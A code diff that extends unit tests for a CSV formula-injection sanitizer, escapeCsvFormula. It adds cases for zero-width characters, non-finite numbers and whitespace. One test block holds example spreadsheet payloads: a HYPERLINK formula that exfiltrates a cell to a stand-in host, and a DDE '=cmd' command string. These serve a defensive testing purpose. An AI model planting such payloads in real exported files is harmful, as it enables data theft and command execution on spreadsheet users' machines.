@@ -781,7 +781,41 @@ describe('escapeCsvFormula', () => {
     ['\t=danger', "'\t=danger"],
     ['\r=danger', "'\r=danger"],
     ['  =danger', "'  =danger"],
+    ['\t@SUM(A1)', "'\t@SUM(A1)"],
+    ['\r-1+1', "'\r-1+1"],
+    ['\n\t =evil', "'\n\t =evil"],
   ])('treats leading whitespace/control before a trigger as a formula (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    // Zero-width chars are invisible to JS \s but stripped by spreadsheets before
+    // parsing, so a leading one must not hide a formula trigger (CWE-1236 bypass).
+    ['\u200B=1+1', "'\u200B=1+1"], // zero-width space
+    ['\u200C@SUM(A1)', "'\u200C@SUM(A1)"], // zero-width non-joiner
+    ['\u200D=cmd', "'\u200D=cmd"], // zero-width joiner
+  ])('escapes triggers hidden behind zero-width characters (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    // Number() treats these as valid numbers, but they are not finite numerals and
+    // must still be escaped so the -/+ numeric carve-out cannot be abused.
+    ['-Infinity', "'-Infinity"],
+    ['+Infinity', "'+Infinity"],
+    ['-1e400', "'-1e400"], // overflows to -Infinity
+  ])('escapes non-finite numeric-looking values (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    // Real-world payloads, to make the protection legible to reviewers.
+    [
+      '=HYPERLINK("https://evil.example?x="&A1,"click")',
+      '\'=HYPERLINK("https://evil.example?x="&A1,"click")',
+    ],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+  ])('neutralizes real exfiltration/command payloads (%p)', (input, expected) => {
     expect(escapeCsvFormula(input)).toBe(expected);
   });
 
@@ -801,6 +835,8 @@ describe('escapeCsvFormula', () => {
     ['a=b', 'a=b'],
     ['user@example.com', 'user@example.com'],
     ['', ''],
+    ['   ', '   '],
+    ['\t\t', '\t\t'],
   ])('leaves non-formula values untouched (%p)', (input, expected) => {
     expect(escapeCsvFormula(input)).toBe(expected);
   });
